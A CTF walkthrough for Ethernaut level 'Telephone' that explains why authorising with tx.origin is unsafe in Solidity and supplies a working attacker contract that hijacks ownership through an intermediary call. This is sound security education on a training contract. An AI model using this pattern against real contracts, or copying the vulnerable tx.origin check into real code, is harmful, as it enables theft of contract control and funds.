---
title: Ethernaut 0x4 - Telephone Walkthrough
date: 2021-04-20 10:54:43.423 +0800 
categories:
  - "Write Up"
---

### Overview

Claim ownership of the contract to win this level. This is an introduction to the concept of `tx.origin` .

`Telephone.sol`

```solidity
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

{{% notice info %}}
`tx.origin` is a global variable in Solidity which returns the address of the account that sent the transaction.
{{% /notice %}}


### Transaction Origins and Authorization

Never use `tx.origin` for authorization, another contract can have a method which will call your contract (where the user has some funds for instance) and your contract will authorize that transaction as your address is in `tx.origin`.

https://docs.soliditylang.org/en/v0.8.0/security-considerations.html#tx-origin

The `tx.origin` global variable refers to the original external account (EoA) that **started** the transaction while `msg.sender` refers to the immediate account (it could be external or another contract account) that invokes the function.

If there are multiple function invocations on multiple contracts, `tx.origin` will always refer to the account that started the transaction irrespective of the stack of contracts invoked.

### Solution

Head over to [Remix IDE](https://remix.ethereum.org/) and deploy a malicious contract `TelephoneHack.sol`. If a victim is tricked into using this contract, the `tx.origin` will contain his address, while `msg.sender` will contain the malicious contract's address.

`TelephoneHack.sol`

```solidity
pragma solidity ^0.6.0;

import './Telephone.sol';

contract TelephoneHack {
    
    address private instance = 0x943C7fa484528dbc47Cc51F5592E9dea87bDCdc1;
    address private attacker;

    Telephone public originalContract = Telephone(instance);
    
    constructor() public {
        originalContract = Telephone(instance);
        attacker = msg.sender;
    }
    
    function changeOwner() public {
        originalContract.changeOwner(attacker);
    }
    
}
```

